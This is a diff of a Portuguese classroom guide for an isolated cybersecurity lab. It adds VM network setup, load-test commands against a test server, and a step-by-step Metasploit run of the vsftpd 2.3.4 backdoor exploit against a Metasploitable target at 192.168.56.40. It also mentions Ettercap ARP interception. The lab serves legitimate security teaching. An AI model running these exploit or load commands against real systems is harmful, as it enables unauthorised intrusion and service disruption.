@@ -39,6 +39,39 @@ Padrão usado nas evidências: faixa isolada **`192.168.56.0/24`** (host-only do
 
 Se sua rede for outra, edite as constantes no topo de `material-pratico/desafio-final/gerar_evidencias.py` e **regenere** (`python3 gerar_evidencias.py`), além de passar o IP certo aos scripts.
 
+### Fazer o Kali e o Windows VM se enxergarem (configuração mínima)
+
+**No hipervisor (VirtualBox: faça nas DUAS VMs — Kali e Windows):**
+`Configurações → Rede → Adaptador 1` → modo **Placa somente-hospedeiro (host-only)**, cabo conectado, modo promíscuo "Permitir tudo" (só precisa no Ettercap ao vivo). *VMware:* `Host-only` (vmnet1) nas duas. *Kali físico:* Windows VM em **Bridge** para o switch isolado do lab.
+
+**Endereços (mesma sub-rede, gateway vazio):** Kali `192.168.56.20` · Windows `192.168.56.30` · máscara `255.255.255.0`.
+
+**Windows VM (PowerShell/CMD como Administrador):**
+```bat
+netsh interface ip set address name="Ethernet" static 192.168.56.30 255.255.255.0
+netsh advfirewall firewall add rule name="Lab ICMPv4" protocol=icmpv4:8,any dir=in action=allow
+```
+(o firewall do Windows bloqueia ping de entrada por padrão — a 2ª linha é obrigatória; veja o nome do adaptador com `netsh interface show interface`)
+
+**Kali:**
+```bash
+nmcli con show      # nome da conexão (ex.: "Wired connection 1")
+sudo nmcli con mod "Wired connection 1" ipv4.method manual ipv4.addresses 192.168.56.20/24 ipv4.gateway "" ipv4.dns ""
+sudo nmcli con up "Wired connection 1"
+```
+
+**Verificação (obrigatória nas duas direções):**
+```bash
+# no Kali
+ping -c 3 192.168.56.30
+```
+```bat
+:: no Windows
+ping 192.168.56.20
+```
+
+Passo a passo completo (com diagnóstico de falhas): seção 4 do plano `aula-ciberseguranca-ddos-malware-rce.md` → "Configuração de rede — Kali × Windows VM".
+
 ## Antes da aula (5 min de checagem)
 ```bash
 # no host da estação do professor
@@ -56,20 +89,26 @@ cd material-pratico/desafio-final && python3 gerar_evidencias.py
 
 ## Ordem de execução na aula
 
+> **Valores padrão deste laboratório** (ajuste se a sua rede for outra — os comandos abaixo já vêm prontos para copiar e colar):
+> - Servidor de teste (Pi/professor): `192.168.56.10` · Kali: `192.168.56.20` · Windows: `192.168.56.30` · Alvo Metasploitable: `192.168.56.40` · Atacante (sintético): `192.168.56.50`
+
 ### Prática 1 — DDoS / disponibilidade (~15 min)
-**No servidor (Pi ou Kali):**
+**No servidor (Pi ou Kali) — abra DUAS abas de terminal:**
 ```bash
 cd material-pratico/pratica1-ddos
-python3 servidor_teste.py                 # fica rodando; anote o IP do host
-# em outra aba DO SERVIDOR:
+python3 servidor_teste.py
+```
+```bash
+# na 2ª aba DO SERVIDOR:
+cd material-pratico/pratica1-ddos
 ./monitorar_recursos.sh 8000
 ```
 **Na estação cliente:**
 ```bash
 cd material-pratico/pratica1-ddos
-./medir_baseline.sh  <IP_SERVIDOR> 8000 /status      # linha de base
-./carga_controlada.sh <IP_SERVIDOR> 8000 /relatorio 200 10   # carga
-./medir_baseline.sh  <IP_SERVIDOR> 8000 /relatorio   # comparar DURANTE
+./medir_baseline.sh 192.168.56.10 8000 /status
+./carga_controlada.sh 192.168.56.10 8000 /relatorio 200 10
+./medir_baseline.sh 192.168.56.10 8000 /relatorio
 ```
 Observe: latência sobe? aparecem falhas? CPU satura? → discutir teste legítimo × DDoS.
 **Parar:** `Ctrl+C` no cliente e no servidor.
@@ -77,23 +116,49 @@ Observe: latência sobe? aparecem falhas? CPU satura? → discutir teste legíti
 ### Prática 2 — RCE com Metasploit (~20 min)
 ```bash
 cd material-pratico/pratica2-rce
-./reconhecimento.sh <IP_ALVO>        # ex.: 192.168.56.40
-# depois siga roteiro-metasploit.md passo a passo
+./reconhecimento.sh 192.168.56.40
+msfconsole -q
+```
+Dentro do msfconsole (cenário padrão vsftpd 2.3.4 — detalhes e saídas esperadas em `roteiro-metasploit.md`):
+```
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOSTS 192.168.56.40
+check
+run
+id
+hostname
+exit
+sessions -K
+exit
 ```
 Sem alvo vivo? Use o **plano alternativo** do roteiro + `material-pratico/desafio-final/recon_services.txt` e `host_events.log`.
 
 ### Prática 3 — Interceptação / Ettercap (~15 min)
 ```bash
 cd material-pratico/pratica3-ettercap
-./analisar_pcap.sh ../desafio-final      # HTTP-claro vs TLS + ARP envenenado
-./ver_arp.sh                              # tabela ARP da máquina (Windows: arp -a)
+./analisar_pcap.sh ../desafio-final
+./ver_arp.sh
+ip neigh        # Linux (Pi/Kali): tabela ARP/vizinhança
+arp -a          # Windows: tabela ARP
 ```
 Demonstração ao vivo do Ettercap é **opcional** e só em rede isolada com tráfego sintético (ver seção 8 do plano). Se a interface não aparecer, fique na análise de `.pcap`.
 
 ### Desafio final — "Sertão Digital" (~25 min + apresentações)
-1. Entregue aos grupos o `material-pratico/desafio-final/BRIEFING-alunos.md` e as evidências (tudo em `material-pratico/desafio-final/`, **exceto** o `GABARITO`).
-2. Grupos analisam com editor de texto, planilha, Wireshark e `analisar_pcap.sh`.
-3. Correção com `material-pratico/desafio-final/GABARITO-professor.md` (arquivo local do professor, fora do repositório) e rubrica (seção 13 do plano).
+**Entregue aos grupos** (copiar para as estações deles): `material-pratico/desafio-final/BRIEFING-alunos.md` + todas as evidências da pasta (logs, CSV, TXT, `.pcap`) — **exceto** o `GABARITO`.
+**Análise pelos grupos (comandos prontos):**
+```bash
+cd material-pratico
+pratica3-ettercap/analisar_pcap.sh desafio-final        # HTTP/TLS + ARP envenenado
+cat desafio-final/web_metrics.csv                       # métricas (abrir na planilha)
+cat desafio-final/host_events.log                       # eventos do host
+cat desafio-final/recon_services.txt                    # reconhecimento do alvo
+cat desafio-final/arp_table_before_after.txt            # ARP antes/depois
+wireshark desafio-final/lab_trafego.pcap                # se Wireshark gráfico instalado
+wireshark desafio-final/arp_incident.pcap
+```
+Correção com `material-pratico/desafio-final/GABARITO-professor.md` (arquivo local do professor, fora do repositório) e rubrica (seção 13 do plano).
 
 ---
 
